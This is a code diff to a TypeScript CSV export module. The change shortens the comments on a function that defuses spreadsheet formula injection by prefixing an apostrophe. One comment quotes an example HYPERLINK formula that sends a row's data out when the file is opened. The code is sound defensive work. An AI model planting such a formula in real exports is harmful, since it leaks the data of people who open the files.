@@ -28,20 +28,16 @@ const FORMULA_LEAD = /^[=+@\t\r]/
 const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][+-]?\d+)?$/
 
 /**
- * Defuse a cell a spreadsheet would execute.
+ * Defuse a cell a spreadsheet would execute. These exports are meant for Excel
+ * or Sheets (`Content-Disposition: attachment`), and their strings come from
+ * outside this Worker: job titles, incident titles, vendor price notes,
+ * judge-written headlines. A cell beginning `=`, `+`, `@` or `-` is a formula
+ * there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates the row on open with
+ * no macro prompt.
  *
- * These exports are meant to be opened in Excel or Sheets — that is what
- * `Content-Disposition: attachment` is for — and the strings in them are not
- * ours: job titles, incident titles, vendor price notes and judge-written
- * headlines all originate outside this Worker. A cell beginning `=`, `+`, `@`
- * or `-` is a formula there, and `=HYPERLINK("https://…"&A1,"x")` exfiltrates
- * the row on open, with no macro prompt and no warning.
- *
- * A leading apostrophe is the standard defusal: the spreadsheet treats the
- * rest as literal text. It is visible in the cell, which is a real cost for a
- * project that exports verbatim source data — so it is spent only where a
- * value would otherwise be executed, and never on a plain number, which is
- * the one case where a leading `-` is data rather than a fuse.
+ * A leading apostrophe makes the rest literal text. It is visible in the cell,
+ * a cost for verbatim source data, so it is spent only where a value would
+ * execute, never on a plain number (where a leading `-` is data).
  */
 export function defuseFormula(text: string): string {
   if (FORMULA_LEAD.test(text)) return `'${text}`
@@ -51,8 +47,7 @@ export function defuseFormula(text: string): string {
 
 /** RFC 4180: quote when the value carries a comma, a quote, or a line break.
  * A list (an incident's components) is one JSON cell, not a comma-joined string
- * that a spreadsheet would split. Formula leads are defused first — see
- * defuseFormula — so quoting never wraps a cell the reader would execute. */
+ * a spreadsheet would split. Formula leads are defused first (defuseFormula). */
 export function csvCell(value: unknown): string {
   if (value === null || value === undefined) return ''
   const text = defuseFormula(
@@ -144,7 +139,7 @@ export function streamOf(chunks: AsyncGenerator<string>): ReadableStream<Uint8Ar
   })
 }
 
-/** Everything the stream yielded, joined — for tests and small exports. */
+/** Everything the stream yielded, joined, for tests and small exports. */
 export async function collect(chunks: AsyncGenerator<string>): Promise<string> {
   let out = ''
   for await (const chunk of chunks) out += chunk
